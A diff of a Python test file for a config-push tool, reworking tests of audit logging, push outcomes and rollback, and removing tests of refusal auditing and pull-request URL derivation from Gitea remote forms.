+def test_result_surfaces_an_audit_failure_without_vetoing(repo, tmp_path):
     blocker = tmp_path / "blocked"
     blocker.write_text("not a dir")
-    _commit(
-        repo,
-        CONFIG_REL,
-        "services:\n  a: []\n",
-        name=IDENT_NAME,
-        email=IDENT_EMAIL,
-        msg="doc-cache: add a",
-    )
-
-    out = _push(repo, audit_dir=blocker)
-
-    assert out["pushed"] is True, "a broken audit sink must not veto a validated push"
+    out = _change(_target(repo, audit_dir=blocker), _add_text())
+    assert out["outcome"] == "pushed"
     assert "audit_error" in out
 
 
-def test_refusal_is_audited(repo, tmp_path):
-    import json
-
+def test_every_decision_is_audited(repo, bare, tmp_path):
     audit = tmp_path / "audit"
-    _commit(repo, "scripts/evil.sh", "x\n", name=IDENT_NAME, email=IDENT_EMAIL, msg="c")
+    _change(_target(repo, audit_dir=audit), _add_text())
+    _reject_pushes(bare)
+    c = _add_text() + "  c:\n  - topic: t\n    url: https://docs.example.com/c\n"
+    _change(_target(repo, audit_dir=audit), c)
 
-    out = _push(repo, audit_dir=audit)
-
-    assert out["pushed"] is False
-    event = json.loads(next(audit.glob("*.jsonl")).read_text().strip())
-    assert "REFUSED" in event["summary"]
-    assert event["metadata"]["reason"] == out["reason"]
-
-
-# --- PR url derivation ---------------------------------------------------------------
-
-
-@pytest.mark.parametrize(
-    "remote",
-    [
-        "ssh://git@gitea.example.com:2222/org/repo.git",
-        "git@gitea.example.com:org/repo.git",
-        "https://gitea.example.com/org/repo.git",
-    ],
-)
-def test_pr_url_from_every_remote_form_in_use(remote):
-    url = _pr_url(remote, "review/x", "main")
-    assert url == "https://gitea.example.com/org/repo/compare/main...review/x"
-
-
-def test_pr_url_gives_up_cleanly_on_a_weird_remote():
-    assert _pr_url("some-nonsense", "b", "main") is None
+    events = [json.loads(x) for x in next(audit.glob("*.jsonl")).read_text().splitlines()]
+    assert [e["metadata"]["outcome"] for e in events] == ["pushed", "rolled_back"]
+    assert all(e["metadata"]["change"] == "additive" for e in events)
